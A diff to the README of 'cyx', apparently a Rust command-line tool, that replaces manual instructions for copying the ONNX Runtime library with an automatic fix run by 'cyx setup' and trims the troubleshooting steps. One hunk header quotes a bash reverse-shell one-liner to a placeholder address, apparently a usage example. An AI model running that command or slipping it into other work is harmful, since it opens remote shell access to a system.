@@ -104,16 +104,20 @@ cd cyx
 # Install the binary
 cargo install --path .
 
-# IMPORTANT: Copy the ONNX Runtime library
-# Find where cargo installed it (usually ~/.cargo/bin)
-INSTALL_DIR=$(dirname $(which cyx))
-cp target/release/libonnxruntime* $INSTALL_DIR/
-
-# Run setup
+# Run setup - it will auto-detect and fix ONNX library issues
 cyx setup
 ```
 
-**Note**: `cargo install` only copies the binary, not the required ONNX library. You must manually copy it as shown above.
+**Auto-Fix Feature**: When you run `cyx setup` or any command, cyx will automatically detect if the ONNX Runtime library is missing and attempt to fix it by:
+1. Locating the library in your cargo build cache
+2. Copying it to the binary directory
+3. Providing manual instructions if auto-fix fails
+
+**Manual Copy** (if auto-fix doesn't work):
+```bash
+INSTALL_DIR=$(dirname $(which cyx))
+cp target/release/libonnxruntime* $INSTALL_DIR/
+```
 
 #### Makefile Commands
 
@@ -210,28 +214,40 @@ bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 
 ### Error: libonnxruntime.so.1.16.0: cannot open shared object file
 
-This error means the ONNX Runtime library is not in the library search path. This happens when:
+This error means the ONNX Runtime library is not in the library search path.
 
-1. You downloaded just the binary without the library
-2. The library is not in the same directory as the binary
-3. The library is not in a system library directory
+**Automatic Fix:**
 
-**Solutions:**
+Simply run:
+```bash
+cyx setup
+```
 
-1. **Download the full release package** from the [Releases page](https://github.com/neur0map/cyx/releases) (not just the binary)
+Cyx will automatically detect the missing library and attempt to fix it by:
+- Searching for the library in your cargo build cache
+- Copying it to the correct location
+- Providing manual instructions if needed
 
-2. **Keep the library with the binary**: Extract the full archive and ensure both files are together:
+**Manual Solutions:**
+
+If auto-fix doesn't work:
+
+1. **For cargo install users**:
+   ```bash
+   # Copy from build cache
+   INSTALL_DIR=$(dirname $(which cyx))
+   cp target/release/libonnxruntime* $INSTALL_DIR/
+   ```
+
+2. **For release downloads**: Extract the full archive and ensure both files are together:
    ```bash
    # Both files should be in the same directory
    ls -l
-   # Should show both:
-   # cyx
-   # libonnxruntime.so.1.16.0 (or .dylib on macOS)
+   # Should show: cyx and libonnxruntime.so.1.16.0 (or .dylib on macOS)
    ```
 
-3. **Install the library system-wide**:
+3. **System-wide installation**:
    ```bash
-   # Copy from the extracted archive
    sudo cp libonnxruntime* /usr/local/lib/
    sudo ldconfig  # Linux only
    ```
